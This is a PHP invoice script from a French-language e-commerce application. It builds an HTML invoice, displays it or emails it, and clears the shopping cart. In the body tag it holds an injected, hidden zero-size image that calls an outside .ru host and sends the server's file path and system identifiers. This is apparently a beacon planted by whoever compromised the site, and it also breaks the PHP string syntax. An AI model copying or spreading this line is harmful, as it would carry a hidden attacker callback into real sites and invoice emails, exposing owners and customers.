<?php
/* Programme : vente_voir.php
* Description : Programme de calcul du panier.
* Auteur : Denis Léveillé 	 		  Date : 2007-10-28
*/
include('lib/config.php');

if( !isset( $_GET['NoFct'] ) || ($_GET['NoFct'] == 0) ) {
	$script = "<script language='javascript'>";
	$script .= "alert('Aucun choix !!!');";
	$script .= "close();";
	$script .= "</script>";
	echo $script;
	exit();
}

$infosVente = vente_get($_GET['NoFct']);
include( "fct_prepare.inc");

//*************************************************************************************************
//*************************************************************************************************


ob_start();
echo
"<html>
	<head>
		<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title>
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1' >
		<meta http-equiv='Content-Disposition' content='inline; filename=Liste de client' >
		<meta http-equiv='Content-Description' content='text/html; charset=iso-8859-1' >
		<meta name='author' content='$NomCieCréé' >
		<meta name='copyright' content='copyright © $CopyAn $NomCie' >
	</head>";
include('styles/style.inc');
echo 
"<body width='$Large' ><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
<table bgcolor='#FFFFFF' width='$Large' cellpadding='0' cellspacing='0' border='1' align='$Enligne' >
	<tr>
		<td>
			<table width='$Large' align='$Enligne' cellpadding='0' cellspacing='0' border='0' bordercolor='#9EA2AB' style='margin-top:2px;' >";
	include('facture.inc');
echo	"
			</table>
		</td>
	</tr>
</table>
<br>
</body>
</html>";

$message = ob_get_contents();

ob_end_clean();

if( $_REQUEST['Commande'] == 'Voir' ) {
	echo $message."<br>";
}
else {
	
	if( $Total > $infosClient['MaxAchat'] )
		$sujet = sprintf( $txt['facture_depasse_sujet'], $param['nom_client'], $_SESSION['OrderId'] ).$txt['facture_duplicata'];
	else {
		if( $_SESSION['paiement']['TrsId'] )
			$sujet = sprintf( $txt['facture_ok_sujet'], $param['nom_client'], $_SESSION['OrderId'] ).$txt['facture_duplicata'];
		else
			$sujet = sprintf( $txt['facture_refus_sujet'], $param['nom_client'], $_SESSION['OrderId'] ).$txt['facture_duplicata'];
	}
	
	$headers  = "MIME-Version: 1.0\r\n";
	$headers .= "Content-type: text/html; charset=iso-8859-1\r\n";
	$headers .= "From: ".$_SESSION['NomLogin']." <".$param['email_envoi'].">\r\n";
	
	if( $_GET['NoCli'] == 0 ) {
		$to = $param['Email_facture'];
		mail($to, $sujet, $message, $headers);
	}
	
	$to=$infosClient['Courriel'];
	
//	mail($to, $sujet, $message, $headers);

	$script = "<script language='javascript'>";
	$script .= "close();";
	$script .= "</script>";
	echo $script;
 //	header( "Location: vente_list.php?NoCli=".$_GET['NoCli'] );
}	

$_SESSION['devise'] = $Devise;

panierReset($_SESSION['panier']);
$_SESSION['panier'] = array();

?>